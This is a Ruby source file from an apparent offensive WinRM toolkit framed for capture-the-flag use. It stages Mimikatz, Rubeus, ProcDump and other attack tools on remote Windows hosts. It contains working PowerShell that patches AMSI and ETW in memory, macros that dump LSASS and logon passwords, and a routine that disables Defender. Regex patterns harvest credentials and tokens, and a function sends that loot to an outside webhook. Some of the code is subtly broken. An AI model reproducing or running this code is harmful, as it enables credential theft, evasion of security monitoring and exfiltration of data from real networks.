# evil-winrm-ctf-extender/lib/evil_ctf/tools.rb

require 'fileutils'
require 'zip'
require 'uri'
require 'net/http'
require 'json'
require 'base64'
require 'digest/sha1'
require 'readline'
require 'shellwords'

module EvilCTF::Tools
  TOOL_REGISTRY = {
    'sharphound' => {
      name: 'SharpHound (BloodHound Collector)',
      filename: 'SharpHound.exe',
      search_patterns: ['SharpHound.exe', 'SharpHound*.exe'],
      description: 'BloodHound AD collector',
      url: 'https://github.com/BloodHoundAD/BloodHound',
      download_url: 'https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe',
      backup_urls: [
        'https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\SharpHound.exe',
      auto_execute: false,
      category: 'recon'
    },
    'rubeus' => {
      name: 'Rubeus',
      filename: 'Rubeus.exe',
      search_patterns: ['Rubeus.exe', 'Rubeus*.exe'],
      description: 'Kerberos abuse / roasting tool',
      url: 'https://github.com/GhostPack/Rubeus',
      download_url: 'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/CompiledBinaries/Rubeus.exe',
      backup_urls: [
        'https://github.com/GhostPack/Rubeus/releases/latest/download/Rubeus.exe'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\Rubeus.exe',
      auto_execute: false,
      category: 'privilege'
    },
    'mimikatz' => {
      name: 'Mimikatz',
      filename: 'mimikatz.exe',
      search_patterns: ['mimikatz*.zip', 'mimikatz*.exe'],
      description: 'Credential dumping tool',
      url: 'https://github.com/ParrotSec/mimikatz',
      download_url: 'https://github.com/ParrotSec/mimikatz/blob/master/x64/mimikatz.exe',
      backup_urls: [
        'https://github.com/GhostPack/Mimikatz/releases/latest/download/mimikatz.zip'
      ],
      zip: true,
      zip_pick: 'mimikatz_trunk\\x64\\mimikatz.exe',
      zip_pick_x64: 'mimikatz_trunk\\x64\\mimikatz.exe',
      zip_pick_x86: 'mimikatz_trunk\\x86\\mimikatz.exe',
      recommended_remote: 'C:\\Users\\Public\\mimikatz.exe',
      auto_execute: false,
      category: 'privilege'
    },
    'powerview' => {
      name: 'PowerView',
      filename: 'PowerView.ps1',
      search_patterns: ['PowerView.ps1', 'PowerView*.ps1'],
      description: 'Active Directory enumeration tool',
      url: 'https://github.com/PowerShellMafia/PowerView',
      download_url: 'https://raw.githubusercontent.com/PowerShellMafia/PowerView/master/PowerView.ps1',
      backup_urls: [
        'https://raw.githubusercontent.com/PowerShellMafia/PowerView/master/PowerView.ps1'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\PowerView.ps1',
      auto_execute: false,
      category: 'recon'
    },
    'seatbelt' => {
      name: 'Seatbelt',
      filename: 'Seatbelt.exe',
      search_patterns: ['Seatbelt.exe', 'Seatbelt*.exe'],
      description: 'Security-oriented host survey',
      url: 'https://github.com/GhostPack/Seatbelt',
      download_url: 'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/CompiledBinaries/Seatbelt.exe',
      backup_urls: [
        'https://github.com/GhostPack/Seatbelt/releases/latest/download/Seatbelt.exe'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\Seatbelt.exe',
      auto_execute: false,
      category: 'recon'
    },
    'inveigh' => {
      name: 'Inveigh',
      filename: 'Inveigh.ps1',
      search_patterns: ['Inveigh.ps1', 'Inveigh*.ps1'],
      description: 'LLMNR/NBT-NS poisoning tool',
      url: 'https://github.com/Kevin-Robertson/Inveigh',
      download_url: 'https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1',
      backup_urls: [
        'https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\Inveigh.ps1',
      auto_execute: false,
      category: 'recon'
    },
    'procdump' => {
      name: 'ProcDump',
      filename: 'procdump64.exe',
      search_patterns: ['procdump*.exe'],
      description: 'Process dump utility',
      url: 'https://learn.microsoft.com/en-us/sysinternals/downloads/procdump',
      download_url: 'https://live.sysinternals.com/tools/procdump64.exe',
      backup_urls: [
        'https://live.sysinternals.com/tools/procdump64.exe'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\procdump64.exe',
      auto_execute: false,
      category: 'memory'
    },
    'winpeas' => {
      name: 'WinPeas',
      filename: 'winPEAS.exe',
      search_patterns: ['winPEAS*.exe'],
      description: 'Windows Enumeration',
      url: 'https://github.com/peass-ng/PEASS-ng/',
      download_url: 'https://github.com/peass-ng/PEASS-ng/releases/download/20251115-74c9337c/winPEASx64.exe',
      backup_urls: [
        'https://github.com/peass-ng/PEASS-ng/releases/download/20251115-74c9337c/winPEASx64.exe'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\winPEAS.exe',
      auto_execute: false,
      category: 'recon'
    }    
    
  }.freeze

  # AMSI bypass script
  BYPASS_4MSI_PS = <<~PS
    $kernel32 = @"
    using System; using System.Runtime.InteropServices;
    public class kernel32 {
        [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
    "@
    Add-Type $kernel32
    $amsiDll = [kernel32]::LoadLibrary("amsi.dll")
    $scanBuffer = [kernel32]::GetProcAddress($amsiDll, "AmsiScanBuffer")
    $oldProtect = 0
    [kernel32]::VirtualProtect($scanBuffer, [uint32]5, 0x40, [ref]$oldProtect) | Out-Null
    $patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $scanBuffer, 6)
    "[+] AMSI bypassed (AmsiScanBuffer patched)"
    try { IEX ("Am"+"siU"+"tils") } catch { "[+] Bypass confirmed" }
  PS

  # ETW bypass script
  ETW_BYPASS_PS = <<~PS
    $kernel32 = @"
    using System; using System.Runtime.InteropServices;
    public class kernel32 {
        [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
    "@
    Add-Type $kernel32
    $ntdll = [kernel32]::LoadLibrary("ntdll.dll")
    $funcs = @("EtwEventWrite","EtwEventWriteTransfer","EtwEventWriteFull","EtwEventWriteEx")
    $patch = [Byte[]] (0x48, 0x33, 0xC0, 0xC3)
    foreach ($f in $funcs) {
      $addr = [kernel32]::GetProcAddress($ntdll, $f)
      if ($addr -ne 0) {
        $old = 0
        [kernel32]::VirtualProtect($addr, 4, 0x40, [ref]$old) | Out-Null
        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 4)
      }
    }
    try {
      $type = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
      $field = $type.GetField('etwProvider','NonPublic,Static')
      $field.SetValue($null, [Activator]::CreateInstance("System.Diagnostics.Eventing.EventProvider", [Guid]::NewGuid()))
    } catch {}
    "[+] Full ETW bypass completed"
  PS

  class CommandManager
    def initialize
      @aliases = { 'ls'=>'Get-ChildItem', 'whoami'=>'$env:USERNAME', 'pwd'=>'Get-Location', 'ps'=>'Get-Process' }
      @macros = {
        'kerberoast'     => [BYPASS_4MSI_PS, '& "C:\\Users\\Public\\Rubeus.exe" kerberoast /outfile:C:\\Users\\Public\\hashes.txt 2>$null'],
        'dump_creds'     => [BYPASS_4MSI_PS, '& "C:\\Users\\Public\\mimikatz.exe" privilege::debug sekurlsa::logonPasswords exit'],
        'lsass_dump'     => [BYPASS_4MSI_PS, '& "C:\\Users\\Public\\procdump64.exe" -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp 2>$null']
      }
    end

    def expand_alias(cmd)
      @aliases.each do |k, v|
        return cmd.sub(k, v) if cmd.start_with?(k)
      end
      cmd
    end

    def expand_macro(name, shell, webhook: nil)
      macro = @macros[name.downcase]
      return false unless macro

      puts "[*] Expanding macro: #{name}"
      macro.each do |step|
        result = shell.run(step)
        puts result.output.strip
        matches = grep_output(result.output)
        if matches.any?
          save_loot(matches)
          beacon_loot(webhook, matches) if webhook
        end
      end
      true
    end

    def list_macros; @macros.keys.sort end
    def list_aliases; @aliases.keys.sort end
  end

  # Helper functions for tool handling
  def self.download_tool(key)
    tool = TOOL_REGISTRY[key]
    return nil unless tool && (tool[:download_url] || tool[:backup_urls])

    FileUtils.mkdir_p('tools')
    path = File.join('tools', tool[:filename])
    return path if File.exist?(path)

    all_urls = [tool[:download_url]] + (tool[:backup_urls] || [])
    all_urls.compact!
    success = false

    all_urls.each do |url|
      next unless url
      puts "[*] Trying #{url}..."
      success = download_from_url(url, path)
      break if success
    end

    success ? path : nil
  rescue => e
    puts "[!] Download failed for #{key}: #{e.message}"
    nil
  end

  def self.download_from_url(url, path)
    success = false

    curl_cmd = "curl -L --fail -o #{Shellwords.escape(path)} #{Shellwords.escape(url)}"
    success = system("#{curl_cmd} > /dev/null 2>&1") if success == false
    unless success
      wget_cmd = "wget -O #{Shellwords.escape(path)} #{Shellwords.escape(url)}"
      success = system("#{wget_cmd} > /dev/null 2>&1")
    end

    unless success
      begin
        URI.open(url) do |f|
          File.binwrite(path, f.read)
        end
        success = true
      rescue => e
        puts "[!] Ruby open-uri download failed: #{e.message}"
      end
    end

    unless success
      ps_cmd = "powershell -Command \"try { Invoke-WebRequest -Uri '#{url}' -OutFile '#{path}' -UseBasicParsing } catch { exit 1 }\""
      success = system(ps_cmd)
    end

    success
  end

  def self.download_missing_tools; TOOL_REGISTRY.each_key { |k| download_tool(k) }; end

  # Auto staging logic (simplified from original)
  def self.safe_autostage(tool_key, shell, options, logger)
    tool = TOOL_REGISTRY[tool_key]
    return false unless tool
    remote_path = tool[:recommended_remote]
    check_cmd = "if (Test-Path '#{remote_path}') { 'EXISTS' } else { 'MISSING' }"
    result = shell.run(check_cmd)
    return true if result.output.include?('EXISTS')

    arch = get_system_architecture(shell)
    adjusted_tool = tool.dup
    # architecture-specific adjustments omitted for brevity

    local_path = find_tool_on_disk(tool_key)
    unless local_path && File.exist?(local_path)
      puts "[!] Local tool not found: #{adjusted_tool[:filename]}"
      local_path = download_tool(tool_key)
      return false unless local_path && File.exist?(local_path)
    end

    puts "[*] Staging #{adjusted_tool[:name]} to #{remote_path}"
    upload_file(local_path, remote_path, shell)
  rescue => e
    puts "[!] Auto staging failed: #{e.message}"
    false
  end

  def self.list_available_tools
    puts "\n AVAILABLE TOOLS ".ljust(70, '=')
    TOOL_REGISTRY.group_by { |_, v| v[:category] }.each do |cat, tools|
      puts "\n #{cat.upcase}:"
      tools.each do |key, t|
        local_status = File.exist?(File.join('tools', t[:filename])) ? '📁' : '❌'
        puts " [#{local_status}] #{t[:name]} (#{key}) - #{t[:description]}"
      end
    end
    puts "\nCommands:"
    puts "  tools                   - List available tools"
    puts "  download_missing        - Download all missing tools into ./tools"
    puts "  tool <name>             - Stage and use a specific tool"
    puts "  tool all                - Stage all available tools"
    puts '=' * 70
  end

  # Enhanced helper functions for loot handling
  def self.grep_output(output)
    return [] unless output
    
    matches = []
    
    # Enhanced patterns for comprehensive loot detection
    patterns = [
      # CTF style flags
      /flag\{[^}]+\}/i,
      /FLAG\{[^}]+\}/i,
      
      # Credentials and hashes
      /password[:\s]+([^\r\n]+)/i,
      /pass[:\s]+([^\r\n]+)/i,
      /hash[:\s]+([a-f0-9]{32,})/i,
      /NTLM\s*:\s*([A-F0-9]{32})/i,
      /LM\s*:\s*([A-F0-9]{32})/i,
      /Hash\s*:\s*([A-F0-9]{32})/i,
      
      # JWTs and tokens
      /[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}/,
      /Bearer\s+[A-Za-z0-9_\-]{20,}/i,
      
      # Email/password pairs
      /([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}):\s*([^\r\n]+)/,
      
      # Base64 encoded data
      /[A-Za-z0-9+\/=]{200,}/,
      
      # Kerberos artifacts
      /krb5\s*\w+\s*[A-Za-z0-9+\/=]{100,}/i,
      /Ticket\s*:\s*[A-Za-z0-9+\/=]+/i,
      
      # SSH/private key material
      /-----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY-----/,
      /ssh-[a-z0-9]+ [A-Za-z0-9+\/=]{100,}/,
      
      # Database connection strings
      /password\s*=\s*[^\r\n]+/i,
      /pwd\s*=\s*[^\r\n]+/i,
      
      # API keys and secrets (with proper escaping)
      /[A-Za-z0-9_]{32,}/.match(output) { |m| matches << m[0] if m[0].length > 32 }
    ]
    
    output.each_line do |line|
      patterns.each do |pattern|
        line.scan(pattern) do |match|
          matches << match
        end
      end
    end
    
    # Flatten nested arrays and remove duplicates
    flattened_matches = matches.flatten.uniq
    flattened_matches.reject { |m| m.nil? || m.empty? }
  rescue => e
    puts "[!] Error in grep_output: #{e.message}"
    []
  end

  def self.save_loot(matches)
    return unless matches.any?
    
    FileUtils.mkdir_p('loot')
    timestamp = Time.now.strftime('%Y%m%d_%H%M%S')
    
    # Save general loot to text file
    File.open("loot/loot_#{timestamp}.txt", 'a') do |f|
      matches.each do |m|
        f.puts(m) unless m.is_a?(String) && m.start_with?('{')
      end
    end
    
    # Save JSON credentials separately
    json_loot = []
    matches.select { |m| m.is_a?(String) && m.start_with?('{' ) }.each do |json_match|
      begin
        json_loot << JSON.parse(json_match)
      rescue JSON::ParserError
        # Skip invalid JSON
      end
    end
    
    if json_loot.any?
      File.write('loot/creds.json', JSON.pretty_generate(json_loot))
    end
    
    # Save specialized loot types
    flag_matches = matches.select { |m| m.match?(/flag\{[^}]+\}/i) }
    if flag_matches.any?
      File.open("loot/flags_#{timestamp}.txt", 'a') do |f|
        flag_matches.each { |f| f.puts(f) }
      end
    end
    
    creds_matches = matches.select { |m| m.match?(/password|pass|hash|NTLM|LM|Hash/i) && !m.is_a?(String) || (m.is_a?(String) && !m.start_with?('{' )) }
    if creds_matches.any?
      File.open("loot/credentials_#{timestamp}.txt", 'a') do |f|
        creds_matches.each { |c| f.puts(c) }
      end
    end
    
    puts "[+] Loot saved to loot/ directory"
  rescue => e
    puts "[!] Failed to save loot: #{e.message}"
  end

  def self.beacon_loot(webhook, matches)
    return unless webhook && matches.any?
    
    begin
      uri = URI(webhook)
      req = Net::HTTP::Post.new(uri)
      req['Content-Type'] = 'application/json'
      req.body = { loot: matches }.to_json
      
      Net::HTTP.start(uri.hostname, uri.port, use_ssl: uri.scheme == 'https') do |http|
        http.request(req)
      end
    rescue => e
      puts "[!] Failed to beacon loot: #{e.message}"
    end
  end

  def self.get_system_architecture(shell)
    result = shell.run('$env:PROCESSOR_ARCHITECTURE')
    result.output.strip.downcase
  rescue => e
    puts "[!] Failed to get architecture: #{e.message}"
    'unknown'
  end

  def self.upload_file(local_path, remote_path, shell)
    return false unless File.exist?(local_path)

    content = File.binread(local_path)
    base64_content = Base64.strict_encode64(content)

    # Small file – single shot
    if base64_content.length <= 40000
      ps_single = <<~PS
        try {
          $bytes = [Convert]::FromBase64String('#{base64_content}')
          New-Item -Path '#{remote_path}' -ItemType File -Force | Out-Null
          [System.IO.File]::WriteAllBytes('#{remote_path}', $bytes)
          "SUCCESS"
        } catch {
          "ERROR: $($_.Exception.Message)"
        }
      PS

      result = shell.run(ps_single)
      return false unless result.output.include?('SUCCESS')
    else
      # Chunked upload
      ps_init = <<~PS
        try {
          New-Item -Path '#{remote_path}' -ItemType File -Force | Out-Null
          "INIT"
        } catch {
          "ERROR: $($_.Exception.Message)"
        }
      PS

      init = shell.run(ps_init)
      return false unless init.output.include?('INIT')

      chunks = base64_content.scan(/.{1,40000}/)
      chunks.each_with_index do |chunk, idx|
        ps_chunk = <<~PS
          try {
            $b = [Convert]::FromBase64String('#{chunk}')
            Add-Content -Path '#{remote_path}' -Value $b -Encoding Byte
            "CHUNK #{idx}"
          } catch {
            "ERROR: $($_.Exception.Message)"
          }
        PS

        result = shell.run(ps_chunk)
        return false unless result.output.include?("CHUNK #{idx}")
      end
    end

    # Final verification
    verify = shell.run("if (Test-Path '#{remote_path}') { 'EXISTS' } else { 'MISSING' }")
    verify.output.include?('EXISTS')
  rescue => e
    puts "[!] Upload failed: #{e.message}"
    false
  end

  def self.find_tool_on_disk(tool_key)
    tool = TOOL_REGISTRY[tool_key]
    return nil unless tool
    
    local_path = File.join('tools', tool[:filename])
    File.exist?(local_path) ? local_path : nil
  rescue => e
    puts "[!] Failed to find tool on disk: #{e.message}"
    nil
  end

  def self.disable_defender(shell)
    begin
      # Try to disable Windows Defender real-time monitoring
      result = shell.run('Set-MpPreference -DisableRealtimeMonitoring $true')
      puts "[+] Defender real-time monitoring disabled"
      true
    rescue => e
      puts "[!] Failed to disable defender: #{e.message}"
      false
    end
  end

  # Auto staging for all tools in categories
  def self.autostage_all(shell, categories, options, logger)
    TOOL_REGISTRY.each do |key, tool|
      next if categories && !categories.include?(tool[:category])
      safe_autostage(key, shell, options, logger)
    end
  end

  # Profile management methods
  def self.save_config_profile(name, options)
    FileUtils.mkdir_p('profiles')
    path = File.join('profiles', "#{name}.yaml")

    safe = options.dup
    %i[password logger command_manager history shell].each { |k| safe.delete(k) }

    File.open(path, 'w') { |f| f.write(safe.to_yaml) }
    puts "[+] Saved profile to #{path}"
  rescue => e
    puts "[!] Failed to save profile: #{e.message}"
  end

  def self.load_config_profile(name)
    path = File.join('profiles', "#{name}.yaml")
    return {} unless File.exist?(path)

    YAML.load_file(path) || {}
  rescue => e
    puts "[!] Failed to load profile #{name}: #{e.message}"
    {}
  end
end
